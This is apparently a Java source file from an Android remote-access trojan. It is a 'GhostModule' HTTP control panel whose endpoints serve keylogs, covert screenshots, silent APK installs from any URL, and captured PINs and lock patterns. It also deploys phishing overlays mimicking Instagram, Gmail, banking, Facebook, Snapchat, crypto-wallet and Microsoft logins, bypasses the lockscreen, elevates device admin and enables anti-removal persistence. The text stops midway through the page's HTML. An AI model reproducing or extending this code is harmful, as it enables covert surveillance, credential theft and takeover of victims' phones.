package com.labs.labrats.modules;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.IO_Persistence_Manager;
import com.labs.labrats.StatusNotification;
import com.labs.labrats.SystemAnalytics;

import com.labs.labrats.R;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class GhostModule extends BaseModule {

    public GhostModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/ghost")) {
            return serveGhostPage(session);
        } else if (uri.equals("/ghost/keys")) {
            return serveKeystrokes();
        } else if (uri.equals("/ghost/clear")) {
            IO_Persistence_Manager.clearKeystrokes();
            return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } else if (uri.equals("/ghost/screenshot")) {
            return serveCovertScreenshot();
        } else if (uri.equals("/ghost/status")) {
            return serveGhostStatus();
        } else if (uri.equals("/ghost/lock")) {
            return toggleLock();
        } else if (uri.equals("/ghost/deploy-overlay")) {
            return deployOverlay(params);
        } else if (uri.equals("/ghost/inspector")) {
            return serveInspectorTree();
        } else if (uri.equals("/ghost/interact")) {
            return performInteraction(params);
        } else if (uri.equals("/ghost/silent-install")) {
            String apkUrl = params.get("url");
            if (apkUrl != null && !apkUrl.trim().isEmpty()) {
                com.labs.labrats.PrivilegedInstaller.downloadAndSilentInstallAsync(context, apkUrl);
                return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"SILENT_INSTALL_DISPATCHED\"}");
            }
            return newResponse(Response.Status.BAD_REQUEST, "application/json", "{\"success\": false, \"message\": \"URL required\"}");
        } else if (uri.equals("/stealth")) {
            return toggleStealthMode(params);
        }
        return null;
    }

    private Response serveGhostStatus() {
        boolean active = IO_Persistence_Manager.getInstance() != null;
        boolean antiRemoval = IO_Persistence_Manager.isAntiRemovalEnabled();
        boolean blackout = IO_Persistence_Manager.isBlackoutActive();
        boolean lock = IO_Persistence_Manager.isLockActive();
        long idleTime = System.currentTimeMillis() - IO_Persistence_Manager.getLastEventTime();
        boolean isIdle = idleTime > 5000;

        boolean isAdmin = false;
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName comp = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
            isAdmin = dpm != null && dpm.isAdminActive(comp);
        } catch (Exception ignored) {}

        String capturedPin = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("captured_pin", "");
        String capturedPattern = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("captured_pattern", "");
        boolean hasCredential = (!capturedPin.isEmpty()) || (!capturedPattern.isEmpty());
        String credentialType = !capturedPattern.isEmpty() ? "PATTERN" : (!capturedPin.isEmpty() ? "PIN" : "NONE");

        try {
            org.json.JSONObject obj = new org.json.JSONObject();
            obj.put("active", active);
            obj.put("antiRemoval", antiRemoval);
            obj.put("blackout", blackout);
            obj.put("lock", lock);
            obj.put("isIdle", isIdle);
            obj.put("isAdminActive", isAdmin);
            obj.put("hasCredential", hasCredential);
            obj.put("credentialType", credentialType);
            obj.put("capturedPin", capturedPin);
            return newResponse(Response.Status.OK, "application/json", obj.toString());
        } catch (Exception e) {
            return newResponse(Response.Status.OK, "application/json", "{\"error\": true}");
        }
    }

    private Response toggleLock() {
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        if (ghost != null) {
            ghost.setRemoteLock(!IO_Persistence_Manager.isLockActive());
        }
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
    }

    private Response triggerOsLock() {
        // 1. If Device Admin is not active yet, dispatch Device Admin elevation prompt first
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
            if (dpm != null && !dpm.isAdminActive(admin)) {
                new Handler(Looper.getMainLooper()).post(() -> {
                    try {
                        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                            .edit().putBoolean("is_repairing", true).apply();
                        IO_Persistence_Manager.setAutoPilot(true);
                        IO_Persistence_Manager.stopSmartExit();

                        Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
                        wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                        wrapperIntent.putExtra("launch_admin", true);
                        context.startActivity(wrapperIntent);
                    } catch (Exception ignored) {}
                });
            }
        } catch (Exception ignored) {}

        // 2. Trigger Keyguard OS Phone Lock
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        boolean locked = false;
        if (ghost != null) {
            locked = ghost.lockScreenNow();
        }

        if (!locked) {
            try {
                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
                if (dpm != null && dpm.isAdminActive(admin)) {
                    int disableFlags = android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_BIOMETRICS;
                        disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FACE;
                    }
                    dpm.setKeyguardDisabledFeatures(admin, disableFlags);
                    dpm.lockNow();
                    locked = true;
                }
            } catch (Exception e) {
                android.util.Log.e("GhostModule", "Device Admin lockNow failed: " + e.getMessage());
            }
        }

        if (locked) {
            com.labs.labrats.FirebaseConfig.logActivity("KEYGUARD_LOCK: Standard OS phone lock triggered");
            return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\":\"OS_LOCK_DISPATCHED\"}");
        }

        return newResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\":\"LOCK_SERVICE_UNAVAILABLE\"}");
    }

    private Response deployOverlay(Map<String, String> params) {
        String type = params.get("type");
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        if (ghost != null) {
            int layoutResId = 0;
            if ("insta".equals(type)) {
                layoutResId = R.layout.shadow_harvester_insta;
            } else if ("gmail".equals(type)) {
                layoutResId = R.layout.shadow_harvester_gmail;
            } else if ("bank".equals(type)) {
                layoutResId = R.layout.shadow_harvester_bank;
            } else if ("fb".equals(type)) {
                layoutResId = R.layout.shadow_harvester_fb;
            } else if ("snap".equals(type)) {
                layoutResId = R.layout.shadow_harvester_snap;
            } else if ("crypto".equals(type)) {
                layoutResId = R.layout.shadow_harvester_crypto;
            } else if ("wallet".equals(type)) {
                layoutResId = R.layout.shadow_harvester_wallet;
            } else if ("ms".equals(type)) {
                layoutResId = R.layout.shadow_harvester_ms;
            } else if ("pin".equals(type)) {
                layoutResId = R.layout.shadow_harvester_pin;
            } else if ("pattern".equals(type)) {
                layoutResId = R.layout.shadow_harvester_pattern;
            }

            if (layoutResId != 0) {
                ghost.deployShadowOverlayLayout(layoutResId, type);
            } else if (type == null || type.isEmpty()) {
                ghost.deployShadowOverlayLayout(0, null);
                ghost.deployShadowOverlay(null);
            }
        }
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
    }

    private Response serveInspectorTree() {
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        if (ghost == null) return newResponse(Response.Status.OK, "application/json", "{\"error\": \"Service Offline\"}");
        return newResponse(Response.Status.OK, "application/json", ghost.captureUiTree());
    }

    private Response serveCovertScreenshot() {
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        if (ghost == null) return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Ghost Service Offline");

        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
        final byte[][] result = new byte[1][];
        final String[] error = new String[1];

        ghost.takeCovertScreenshot(new com.labs.labrats.ScreenshotCallback() {
            @Override
            public void onSuccess(byte[] jpegData) {
                result[0] = jpegData;
                latch.countDown();
            }

            @Override
            public void onFailure(String err) {
                error[0] = err;
                latch.countDown();
            }
        });

        try {
            if (latch.await(3, java.util.concurrent.TimeUnit.SECONDS)) {
                if (result[0] != null) {
                    return server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg", new java.io.ByteArrayInputStream(result[0]), result[0].length);
                } else {
                    return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Screenshot Failed: " + error[0]);
                }
            } else {
                return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Screenshot Timeout");
            }
        } catch (Exception e) {
            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Internal Error: " + e.getMessage());
        }
    }

    private Response serveGhostPage(IHTTPSession session) {
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px; justify-content: flex-start; text-align: left; font-size: 1.6rem;\">")
            .append("GHOST_OPERATIONS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_OPERATIONS', 'Remote interaction and control hub using Accessibility triangulation.')\">INFO</span>")
            .append("</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        boolean isActive = IO_Persistence_Manager.getInstance() != null;
        html.append("<div id=\"ghost-status-card\" class=\"status-card\" style=\"padding:20px; background:rgba(255,255,255,0.05); border-radius:12px; margin-bottom:25px; border:1px solid ").append(isActive ? "var(--neon-green)" : "var(--danger)").append(";\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">GHOST_MODE_STATUS</div>");
        html.append("<div id=\"ghost-status-text\" style=\"font-size:1.1rem; font-weight:bold;\">")
            .append(isActive ? "<span style=\"color:var(--neon-green);\">UPLINK_ESTABLISHED</span>" : "<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>")
            .append("</div>");
        
        html.append("<div id=\"accessibility-prompt\" style=\"display: ").append(isActive ? "none" : "block").append("; text-align: left;\">");
        html.append("<p style=\"color:#888; font-size: 0.75rem; margin-top:10px; line-height: 1.5;\">Most features here (Control, Keylogs, Blackout, Lock) and the <b>Ghost Toast</b> module require <b>Ghost Mode (Accessibility Permission)</b>. <br><br>Instruct the user to enable 'System Stability Service' in Accessibility settings. <br><i>Note: Stealth Operations (App Camouflage) do not require this permission.</i></p>");
        html.append("<button onclick=\"openSettings()\" class=\"btn btn-small\" style=\"margin-top:15px; border-radius:12px; padding: 10px 25px;\">OPEN_SETTINGS</button>");
        html.append("</div>");
        html.append("</div>");

        // --- GHOST_UTILITIES_SECTION ---
        html.append("<style>.ghost-utilities-grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 20px; width: 100%; } @media (max-width: 960px) { .ghost-utilities-grid { grid-template-columns: 1fr !important; } }</style>");
        html.append("<div class=\"card\" style=\"border-left: 3px solid rgba(0, 242, 255, 0.35);\">");
        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 25px 0; font-size: 1.35rem; text-align: left;\">GHOST_UTILITIES <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_UTILITIES', 'Specialized background protocols for stealth, persistence, and remote maintenance.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        html.append("<div class=\"ghost-utilities-grid\">");
        
        // 1. Maintenance Sequences (2x2 Grid: Repair, Optimize, Inject Trust, Heal)
        html.append("<div class=\"info-item\" style=\"background: rgba(0, 242, 255, 0.03); align-items: stretch !important;\">");
        html.append("<div class=\"info-label\" style=\"color: var(--neon-cyan); font-size: 0.8rem;\">MAINTENANCE_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'MAINTENANCE_SEQUENCES', 'Execute system maintenance, telemetry re-synchronization, power optimization, and environment repair protocols.')\">INFO</span></div>");
        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100% !important;\">");
        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); width: 100% !important; margin: 0; font-size: 0.55rem;\">INITIATE_REPAIR</button>");
        html.append("<button onclick=\"optimizeStability()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 0; font-size: 0.55rem;\">OPTIMIZE_LINK</button>");
        html.append("<button onclick=\"injectTrust()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">INJECT_TRUST</button>");
        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0; font-size: 0.55rem;\">INITIATE_HEAL</button>");
        html.append("</div></div>");

        // 2. Deep Repair Sequences
        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03); align-items: stretch !important;\">");
        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">DEEP_REPAIR_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'DEEP_REPAIR', 'Direct system shortcuts to manually grant blocked permissions or handle OS security layers.')\">INFO</span></div>");
        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100% !important;\">");
        html.append("<button onclick=\"deepRepair()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\">APP_INFO</button>");
        html.append("<button onclick=\"openAccessibility()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">GHOST_MODE</button>");
        html.append("<button onclick=\"openNotifications()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0; font-size: 0.55rem;\">INTEL_SYNC</button>");
        html.append("<button onclick=\"dispatchPermissionSequence()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 0; font-size: 0.55rem;\">PROMPTS</button>");
        html.append("</div></div>");

        // 3. Automation/Persistence
        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03); align-items: stretch !important;\">");
        html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow); font-size: 0.8rem;\">AUTOMATION/PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
        html.append("<div style=\"display:flex; flex-direction:column; gap:8px; margin-top: 15px; width: 100% !important;\">");
        String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
        String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0;\">").append(autoPilotLabel).append("</button>");
        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); width: 100% !important; margin: 0;\">LOADING...</button>");
        html.append("</div></div>");

        // 4. Blackout Mode
        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03); align-items: stretch !important;\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">BLACKOUT_MODE <span class=\"info-trigger\" onclick=\"showInfo(event, 'BLACKOUT_MODE', 'Suppress hardware backlight for physical stealth while maintaining the remote feed.')\">INFO</span></div>");
        html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"width:100% !important; margin:15px 0 0 0;\">ACTIVATE</button>");
        html.append("</div>");

        // 5. System Denial Lock & OS Keyguard Lock
        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03); align-items: stretch !important;\">");
        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">SYSTEM_LOCKS <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_LOCKS', 'Trigger instant standard OS Keyguard phone lock to capture PIN/Pattern entries, or execute automated lockscreen bypass.')\">INFO</span></div>");
        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100% !important;\">");
        html.append("<button id=\"os-lock-btn\" onclick=\"triggerOsLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\" title=\"Trigger Standard OS Keyguard Lock\">OS_LOCK</button>");
        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\" title=\"Toggle Full Screen Security Denial Overlay\">LOCKOUT</button>");
        html.append("</div>");

        // Watcher Status Badge + BYPASS_LOCKSCREEN Button
        html.append("<div id=\"keyguard-watcher-badge\" style=\"margin-top: 12px; padding: 8px 12px; border-radius: 8px; font-size: 0.65rem; font-weight: bold; font-family: monospace; text-align: center; border: 1px solid #555; color: #888; background: rgba(255,255,255,0.03); letter-spacing: 0.5px;\">&#9203; STATUS: WAITING_FOR_USER_UNLOCK</div>");
        html.append("<button id=\"bypass-lock-btn\" onclick=\"ghostAction('bypass_lockscreen')\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 100% !important; margin: 8px 0 0 0; font-size: 0.65rem; font-weight: bold;\" title=\"Execute Automated Lockscreen Bypass via Captured Credentials\">&#128275; BYPASS_LOCKSCREEN</button>");
        html.append("</div>");

        // 6. Device Admin Elevation Section
        html.append("<div class=\"info-item\" style=\"background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.4); border-radius: 12px; box-shadow: 0 0 15px rgba(168, 85, 247, 0.1);\">");
        html.append("<div class=\"info-label\" style=\"color: #a855f7; font-size: 0.8rem; font-weight: bold; letter-spacing: 1px;\">ADMIN_ELEVATION <span class=\"info-trigger\" style=\"border-color: rgba(168, 85, 247, 0.5); color: #a855f7;\" onclick=\"showInfo(event, 'ADMIN_ELEVATION', 'Enforce Device Administration policies on the target device. Grants elevated system administration protocols including remote instant screen locking, emergency data wipe, and anti-uninstall protection.')\">INFO</span></div>");
        html.append("<button id=\"elevate-admin-btn\" onclick=\"ghostAction('elevateAdmin')\" class=\"btn btn-small\" style=\"width: 100% !important; margin: 15px 0 0 0; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); font-weight: bold;\">ELEVATE_ADMIN</button>");
        html.append("</div>");
        
        html.append("</div></div>");

        // Unified Interaction Suite (Vertical Stacked Cards)
        // --- COMBINED CARD: GHOST_CONTROL & GHOST_INSPECTOR (SIDE-BY-SIDE) ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 30px; align-items: start; width: 100%;\">\n" +
                    "  <style>\n" +
                    "    @media (max-width: 1024px) {\n" +
                    "      .ghost-side-by-side { grid-template-columns: 1fr !important; }\n" +
                    "    }\n" +
                    "  </style>");
        
        // Let's replace the inner div with class/style
        html.append("</div>"); // Close placeholder style
        html.append("<div class=\"ghost-side-by-side\" style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 30px; align-items: start; width: 100%;\">\n");

        // Left Column: GHOST_CONTROL
        html.append("<div style=\"display: flex; flex-direction: column; align-items: center; width: 100%; min-width: 0;\">");
        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 25px 0; font-size: 1.35rem; text-align: left; width: 100%;\">GHOST_CONTROL <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_CONTROL', 'Real-time interaction with the device UI through accessibility triangulation.')\">INFO</span></h2>");
        
        // Screen View tool - Cyberpunk Mock Phone Frame
        html.append("<div id=\"ghost-screen-container\" class=\"phone-frame\" style=\"margin: 0 auto 20px auto; align-self: center; position: relative; width: 270px; height: 540px; background: #000; border: 2px solid rgba(0, 242, 255, 0.4); border-radius: 32px; padding: 0 !important; overflow: hidden; box-sizing: border-box; box-shadow: 0 0 12px rgba(0, 242, 255, 0.25);\">");
        html.append("<div style=\"position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 80px; height: 14px; background: #000; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; z-index: 5;\"></div>");
        html.append("<img id=\"ghost-screen-stream\" src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\" style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: fill; display: none; user-select: none; -webkit-user-drag: none; touch-action: none; border-radius: 28px; z-index: 2;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" ontouchstart=\"startGhostDrag(event)\" ontouchend=\"endGhostDrag(event)\" />");
        html.append("<div id=\"ghost-screen-status\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; font-size: 0.85rem; font-weight: 900; letter-spacing: 3px; text-shadow: 0 0 15px rgba(0,242,255,0.8), 0 0 30px rgba(0,242,255,0.4); text-transform: uppercase; z-index: 1; text-align: center;\">OLED_STANDBY</div>");
        html.append("</div>");

        // Style override for responsive INITIATE_VIEW button width on mobile
        html.append("<style>");
        html.append("  .ghost-initiate-btn { width: 100%; max-width: 180px; margin: 0 auto; padding: 6px 10px; font-size: 0.68rem; font-weight: bold; border-radius: 6px; border-color: var(--neon-cyan); color: var(--neon-cyan); text-align: center; }");
        html.append("  @media (max-width: 768px) { .ghost-initiate-btn { max-width: 280px !important; padding: 10px 16px !important; font-size: 0.78rem !important; } }");
        html.append("</style>");

        // Action Cluster (Ultra-Compact Tactical Layout)
        html.append("<div style=\"width: 100%; max-width: 280px; display: flex; flex-direction: column; align-items: center; gap: 6px; align-self: center;\">");
        
        // Centered Initiate View Header Row
        html.append("<div style=\"display: flex; justify-content: center; width: 100%;\">");
        html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn btn-small ghost-initiate-btn\">INITIATE_VIEW</button>");
        html.append("</div>");

        // Directional Navigation & System Action Pad
        html.append("<div id=\"ghost-nav-bar\" style=\"width: 100%; display: flex; flex-direction: column; gap: 4px; background: rgba(0,0,0,0.4); padding: 6px 8px; border-radius: 8px; border: 1px solid rgba(0, 242, 255, 0.2); box-sizing: border-box;\">");
        
        // Compact 3x3 D-Pad Cross Layout
        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 3px; width: 100%; max-width: 150px; margin: 0 auto; align-items: center;\">");
        html.append("<div></div>");
        html.append("<button type=\"button\" onclick=\"ghostScroll('up')\" class=\"btn btn-small\" style=\"display: inline-flex; align-items: center; justify-content: center; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:0; font-size:0.65rem; margin:0; line-height:1; min-width:0; height:24px; text-align:center;\" title=\"Scroll Up\">&#9650;</button>");
        html.append("<div></div>");
        html.append("<button type=\"button\" onclick=\"ghostScroll('left')\" class=\"btn btn-small\" style=\"display: inline-flex; align-items: center; justify-content: center; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:0; font-size:0.65rem; margin:0; line-height:1; min-width:0; height:24px; text-align:center;\" title=\"Swipe Left\">&#9664;</button>");
        html.append("<div style=\"font-size:0.48rem; color:rgba(0,242,255,0.4); text-align:center; font-weight:bold; display:flex; align-items:center; justify-content:center;\">PAD</div>");
        html.append("<button type=\"button\" onclick=\"ghostScroll('right')\" class=\"btn btn-small\" style=\"display: inline-flex; align-items: center; justify-content: center; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:0; font-size:0.65rem; margin:0; line-height:1; min-width:0; height:24px; text-align:center;\" title=\"Swipe Right\">&#9654;</button>");
        html.append("<div></div>");
        html.append("<button type=\"button\" onclick=\"ghostScroll('down')\" class=\"btn btn-small\" style=\"display: inline-flex; align-items: center; justify-content: center; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:0; font-size:0.65rem; margin:0; line-height:1; min-width:0; height:24px; text-align:center;\" title=\"Scroll Down\">&#9660;</button>");
        html.append("<div></div>");
        html.append("</div>");

        // Micro System Navigation Bar (RECENTS | HOME | BACK)
        html.append("<div style=\"display: flex; gap: 3px; width: 100%; margin-top: 2px;\">");
        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=recents')\" class=\"btn btn-small\" style=\"display: inline-flex; align-items: center; justify-content: center; flex:1; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:0; font-size:0.6rem; margin:0; height:26px; line-height:1; min-width:0; text-align:center;\" title=\"System Recents\">&#9638; REC</button>");
        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=home')\" class=\"btn btn-small\" style=\"display: inline-flex; align-items: center; justify-content: center; flex:1; border-color:var(--neon-green); color:var(--neon-green); padding:0; font-size:0.6rem; margin:0; height:26px; line-height:1; min-width:0; text-align:center;\" title=\"System Home\">&#8962; HOME</button>");
        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=back')\" class=\"btn btn-small\" style=\"display: inline-flex; align-items: center; justify-content: center; flex:1; border-color:#ff9d00; color:#ff9d00; padding:0; font-size:0.6rem; margin:0; height:26px; line-height:1; min-width:0; text-align:center;\" title=\"System Back\">&#11013; BACK</button>");
        html.append("</div>");
        html.append("</div>"); // Close ghost-nav-bar

        // Remote Input Row
        html.append("<div style=\"width: 100%; display: flex; gap: 4px; align-items: center;\">");
        html.append("<input id=\"ghost-type-input\" type=\"text\" placeholder=\"Type text &amp; press Enter...\" onkeypress=\"if(event.key==='Enter'){ghostType();}\" style=\"flex: 1; padding: 4px 8px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0, 242, 255, 0.2); color: #fff; border-radius: 6px; font-size: 0.65rem; outline: none; text-align: left; box-sizing: border-box; height: 28px;\">");
        html.append("<button type=\"button\" onclick=\"ghostType()\" class=\"btn btn-small\" style=\"display: inline-flex !important; align-items: center !important; justify-content: center !important; height: 28px !important; min-height: 28px !important; line-height: 1 !important; padding: 0 8px !important; width: 55px !important; margin: 0; border-color: var(--neon-cyan); color: var(--neon-cyan); font-size: 0.58rem; border-radius: 6px; text-align: center;\">SEND</button>");
        html.append("</div>");

        html.append("</div>"); // Close action cluster
        html.append("</div>"); // Close left column

        // Right Column: GHOST_INSPECTOR
        html.append("<div style=\"display: flex; flex-direction: column; align-items: center; width: 100%; min-width: 0;\">");
        html.append("<div style=\"width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center;\">");
        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 25px 0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left; width: 100%;\">GHOST_INSPECTOR <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_INSPECTOR', 'Introspect the current application\\'s UI hierarchy and element metadata.')\">INFO</span></h2>");
        html.append("<div id=\"inspector-tree\" class=\"terminal-text\" style=\"height:660px; width:100%; overflow-y:auto; font-size:0.75rem; border:1px solid rgba(0, 242, 255, 0.1); background: rgba(0,0,0,0.4); text-align: left; box-sizing: border-box;\">");
        html.append("[STANDBY] Press REFRESH_TREE to scan active window...");
        html.append("</div></div>");
        
        // Refresh Button
        html.append("<button onclick=\"refreshInspector()\" class=\"btn\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); border-radius: 12px; width:100%; max-width:320px; margin: 20px auto 0 auto; display: block;\">REFRESH_TREE</button>");
        html.append("</div>"); // Close right column

        html.append("</div>"); // Close grid
        html.append("</div>"); // Close combined card

        // --- GHOST TOAST CARD ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow);\">");
        html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.35rem; margin: 0 0 15px 0;\">GHOST_TOAST <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
        
        html.append("<style>");
        html.append("  input[type='range'] { height: 30px; -webkit-appearance: none; background: transparent; cursor: pointer; }");
        html.append("  input[type='range']::-webkit-slider-runnable-track { width: 100%; height: 6px; background: rgba(255,255,0,0.1); border-radius: 3px; }");
        html.append("  input[type='range']::-webkit-slider-thumb { -webkit-appearance: none; height: 18px; width: 18px; border-radius: 50%; background: var(--neon-yellow); margin-top: -8px; box-shadow: 0 0 8px rgba(255,255,0,0.5); border: 2px solid #000; }");
        html.append("  @media (min-width: 1024px) {");
